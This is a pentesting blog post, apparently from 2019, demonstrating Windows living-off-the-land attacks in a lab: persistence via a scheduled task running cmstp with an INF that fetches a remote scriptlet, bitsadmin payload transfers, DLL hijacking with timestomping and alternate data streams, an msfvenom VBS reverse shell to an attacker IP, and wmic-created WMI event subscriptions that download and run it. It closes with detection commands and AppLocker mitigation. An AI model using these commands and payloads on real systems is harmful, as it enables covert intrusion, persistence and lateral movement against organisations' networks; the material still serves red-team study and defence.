---
description: With Windows Binaries
---

# Living Off The Land: Part 2

Nov 6, 2019

## Part 2: Living Off The Land

Posted in [Pentesting](https://liberty-shell.com/sec/category/pentesting)

## Intro <a id="intro"></a>

[Another post](https://liberty-shell.com/sec/2018/10/20/living-off-the-land) dedicated to showcase the naturally aspirated aproach to execute, persist and laterally move throughout a Windows network. In this post we’ll dive into additional techniques, from utilizing and _hacking_ built-in Windows binaries.

The goal of this post is to purely showcase Windows Living Off the Land, from using [LOLBins](https://lolbas-project.github.io/), [MITRE Attack](https://attack.mitre.org/matrices/enterprise/windows/), and just regualr Windows CLI tools. This isn’t a malware post, nor a how to most effectively pwn Windows systems post. Credit goes out to all the researchers who discovered and/or enhanced these capabilities.

### Scenario <a id="scenario"></a>

We’ll start out with an elevated shell on a target workstation \(TOTALRECAL\) via a _“phishing campaign”_, with the mission of gaining access to a Windows Server box \(ESCAPEFROMLA\). We’ll also focus on not using powershell, but other built-in Windows biaries.

**Another note:** Although UAC bypassing is a living off the land technique, I’ll leave that for a later post. It’s another beast I need to spend time researching.

So, admin shell on TOTALRECAL…

### Setup Camp <a id="setup-camp"></a>

Before our session dies, we’ll want to maintain persistence. One common technique is to create a **scheduled task**. We’ll do this, but utilize [cmstp.exe](https://attack.mitre.org/techniques/T1191/) to execute a scriptlet.

Given the right parameters and a specially crafted **.INF** and **SCT** file, an attacker can ultimately execute scriptlet commands. In this scenario I’m using a slightly altered version of what’s hosted on the [lolbas project’s github](https://lolbas-project.github.io/lolbas/Binaries/Cmstp/).

To get everything ready an INF file will be created \(dropped on victim\), which gets a remote SCT file \(hosted on our attacking machine\) which contains a scriptlet string of our choosing. Make sense?

![alt text](https://liberty-shell.com/sec/assets/img/lol1.gif)

Check out MITRE’s and LOLBAS projects sources to read more on this technique, but I’ll go into a little more detail to clear things up.

First, the INF file is dropped on the victim, which will be downloaded using **bitsadmin**. I recently made a [quick post](https://liberty-shell.com/sec/2019/07/12/bitsadmin/) on how to attack and detect against BITS if you wish to learn more about this service. A simple download will look something like this:

```text
bitsadmin.exe /transfer "randomName" /download http://IP/file.exe C:\Path\file.exe
```

Before we download the .inf, let’s take a quick look at it:

```text
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://172.20.0.2/lb/w.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```

Simply put, when cmstp.exe is ran with this .inf as a parameter, the scrobj.dll will remotely execute w.sct. Great, so what’s in w.sct?

This can be whatever scriptlet you want, but in this case it’s simply executing a malicious exe \(_shelter.exe_\) we’ll be dropping with BITS as well. Feel free to augment your scritplets to be more creative.

```text
<?XML version="1.0"?>
<scriptlet>
<registration 
  progid="PoC"
  classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
      <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("C:\\Users\\quaid\\AppData\\Local\\shelter.exe");

       ]]>
</script>
</registration>
</scriptlet>
```

So CMSTP runs evil INF to remotely get and run evil SCT, got it. Now it’s time to use BITS and download the storage.inf \(and shelter.exe\)…

![alt text](https://liberty-shell.com/sec/assets/img/lol6.gif)

#### Bringing it all together <a id="bringing-it-all-together"></a>

We have the .inf, .sct and .exe all set. Now we’ll create a scheduled tasks to execute _cmstp.exe_ with the proper parameters. Using [schtasks.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks), the task \(_storage_\) will execute the cmstp.exe string when **any user logs in**, under the user SYSTEM - giving us a SYSTEM shell.

![alt text](https://liberty-shell.com/sec/assets/img/lol3.gif)

We could simply create a scheduled task to run the exe directly, but using cmstp.exe aligns with this post a bit better. Testing it out, a listener is created and _the user_ logs in presenting us with a shell, great.

![alt text](https://liberty-shell.com/sec/assets/img/lol4.gif)

### Primitive Hunting & Gathering <a id="primitive-hunting--gathering"></a>

From here an attacker can look around the system for any juicy vectors like credentials, interesting files, shares, GPO’s, etc. In this case we’ll dive into using shares in order to move laterally.

Enumerating a bit via CLI, a share on host **EscapeFromLA** called _tools_ is discovered. Keeping the spirit of Living off the Land, this should raise some eyebrows. Are there any useful administrative tools? RSAT? What type of users will be executing what tools? PE’s must depend on dll search order, right? Let’s check it out!

![alt text](https://liberty-shell.com/sec/assets/img/lol2.gif)

Cool, so a few tools and installers. Since I did a post a while back about [DLL hijacking with Ghidra](https://liberty-shell.com/sec/2019/03/12/dll-hijacking/) I’m going to use this method as the lateral movement vector. Real quick summary on DLL Hijacking…

**DLL Hijacking** isn’t necessarily a vulnerability itself, but a manipulation of the [default DLL search order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order). When a Windows app executes, it loads various built-in libraries \(DLL’s\) from specific areas in a certain order. If the DLL _does not_ exist in the first place checked, it goes onto the next place to check and so on \(ex: directory the app is in, System32, SysWOW64\). What if we knew a DLL did not exist in the first place checked, so we planted a malicious one? That’s DLL hijacking. Read more on my post and sources listed to drill down.

### Covering More Territory <a id="covering-more-territory"></a>

In order to move laterally, the plan will be to reverse **TcpView.exe** in order trigger a dll hijack with a reverse shell as a payload. We’ll drop the DLL on the share and wait for an “admin” to execute it. To slightly hide our tracks we’ll use a time stomping tool to **edit the dll’s time** to the same time as the PE TcpView. This will be more to showcase methods vs practicality \(like this entire post\).

We won’t go into the weeds on dll hijacking, so in this case we’ll assume it’s all prepped with a shell payload - dll name is **PHLPAPI.dll**. The time stomper app we’ll be using is called **MaceTrap** by [FuzzySecurity](https://www.fuzzysecurity.com/) which is part of the [Sharp-Suite github repo](https://github.com/FuzzySecurity/Sharp-Suite). I’d recommend checking it out if you’re into slick little C\# apps.

Let’s say in this scenario, we need to bundle the \(uncompiled\) MaceTrap C\# project as one file, while **only** being able to use CLI. What are some creative ways of doing this?

In this scenario the idea is to download the archived projected, extract it then build the project with [MSBuild.exe](https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=vs-2019) locally on TotalRecall. We’ll also include the custom dll as well, packed within the projects archived directory.

So how do we extract an archived file with built-in_ish_ Windows CLI tools?

* Powershell can do it, is it logged though?
* How about python or ruby if installed?
* Is 7-zip installed or maybe Java?

![alt text](https://liberty-shell.com/sec/assets/img/lol-tr.gif)

In this case Java was installed on the system. Java has the CLI ability to create/extract java archive files, with the extension of…you guessed it: **.jar**. So we can pack-up our needed files into a jar, drop it, extract it and build the C\# project.

![alt text](https://liberty-shell.com/sec/assets/img/lol8.gif)

Now that it’s extracted we’ll time stomp this malicious dll by running the MaceTrap. The date is set to the same as TcpView.exe and ran:

![alt text](https://liberty-shell.com/sec/assets/img/lol10.gif)

Great, now it’s ready to get moved over to the share. First we’ll move MaceTrap.exe into an [Alternate Data Stream](https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream) in case we need it in the future. Using an ADS may hide or obfuscate our malicious content from defenders. We’ll go with [makecab](https://lolbas-project.github.io/lolbas/Binaries/Makecab/) to create an ADS.

![alt text](https://liberty-shell.com/sec/assets/img/lol12.gif)

One could then delete the parent C\# folder to hide remnants. Now to get the .dll over to the share. This can be done with a simple `copy` command, or even better, bitsadmin with an _upload_ switch.

```text
C:>bitsadmin.exe /transfer "yah" /upload /priority normal \\ESCAPEFROMLA\tools\PHLPAPI.dll C:>\Users\Public\PHLPAPI.dll
```

Now it’s transferred and a listener is waiting to catch a shell. Once a shell is established, it’s on to maintaining persistence once again. This way is a little more crafty…

### Off the Grid <a id="off-the-grid"></a>

One windows method I’ve spent some time testing and reading up on is persistence via [WMI Event Subscriptions](https://liberty-shell.com/sec/2019/06/16/wmi-persistence/). Checkout my post and listed sources for a more thorough description.

**A quick TLDR:** WMI subscriptions trigger an _action_ based off a windows _event_. This _event_ and _action_ can be **set** and **controlled** by the attacker. Ex pseudocode: _Run command “calc.exe” when event ID 42 occurs._ The event is created by the user in a [WMI Query Language](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) \(**WQL**\).

[Empire](http://www.powershellempire.com/?page_id=223) and [Metasploit](https://www.rapid7.com/db/modules/exploit/windows/local/wmi_persistence) each have a module for this technique, which have a default payload of a powershell encoded reverse shell as the action. The payload exists in the WMI database, which can be queried from **wmic** or **powershell**. Cool right? Well there’s a catch: Autoruns pulls WMI database entries by default.

![alt text](https://liberty-shell.com/sec/assets/img/wmi8.png)

Although the entry is listed, it doesn’t necessarily show any glaringly obvious red flags. So would it be better to have the WMI subscription fetch the payload remotely then execute it, migrate sessions/run in memory deleting the remote payload or run the payload directly as one large B64 powershell command stored on system?

It would depend \(in my opinion\). Both would show up as entries in autoruns, but not necessarily all of the fields per entry. How is the network being monitored? How about powershell usage?

![alt text](https://liberty-shell.com/sec/assets/img/lol-esc5.gif)

Since an all-in-one PowerShell payload example has been documented, this scenario will fetch a remote payload and execute.

**Outline of steps that will be taken:**

* Get/Download a reverse shell called **job.vbs** from our attacker controlled server _when_ the system starts up.
* Run job.vbs _when_ a user opens notepad.exe \(this could be outlook.exe or something similar\). A .vbs reverse shell can be generated with msfvenom like so:

```text
msfvenom -p windows/shell/reverse_tcp LHOST=172.20.0.2 LPORT=4141 EXITFUNC=thread -f vbs --arch x86 --platform win > job.vbs
```

I was unable to run multiple commands in one wmi event subscription - using &, && or ; so I decided to go with two event subscriptions. One to get the shell script and the other to execute it.

With Metasploits multi/handler one could run a clean up script if their session dies, or migrate processes and delete the remnant script if so desired.

Here are a few examples of wmic queries to create the events.

```text
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="WinBinsX", QueryLanguage="WQL", Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName= 'NOTEPAD.EXE'"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WinBinsX\"", Consumer="CommandLineEventConsumer.Name=\"WinBinsX\""

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WinBins", CommandLineTemplate="bitsadmin /transfer 'job' /download http://172.20.0.2/shells/job.vbs C:\Users\snake\AppData\Roaming\job.vbs

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WinBinsX", CommandLineTemplate=" wscript.exe C:\\Users\\snake\\AppData\\Roaming\\job.vbs"
```

To check existing WMI event subscriptions, use the following PowerShell commands:

```text
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
```

Now that everything is set we’ll open a multi/handler in metasploit and _see the user_ open up notepad.exe…

![alt text](https://liberty-shell.com/sec/assets/img/lol14.gif)

Great looks like we snagged a shell!

![alt text](https://liberty-shell.com/sec/assets/img/lol-esc.gif)

### Mitigation: AppLocker Whitelisting <a id="mitigation-applocker-whitelisting"></a>

I’ve mentioned this in my previous living off the land post, but AppLocker would be an excellent built-in defense against these types of attacks. In the case of our scenario, do users on **all** machines really need msbuild, wmic, makecab or powershell? Maybe. How about Administrative tools? Start off small and work your way up.

Like [part 1](https://liberty-shell.com/sec/2018/10/20/living-off-the-land/), here’s an example on how to Deny Makecab by an AppLocker Whitelisting rule:

* Run » gpedit.msc
* Computer Configuration » Win. Settings » Sec. Setting » App. Control Pol. » AppLocker
* Right-Click » Properties » Enable all rules collections
* Right-Click » Executable Rules » Create Default Rules
* Add Exception to “All files locate in the Windows folder” » Add Path to makecab.exe
* Apply, restart and make sure Application Identity Service is running
* Go through this process with other simple built-in binaries that aren’t needed.

{% embed url="https://liberty-shell.com/sec/2019/11/06/living-off-the-land-pt2/" caption="" %}

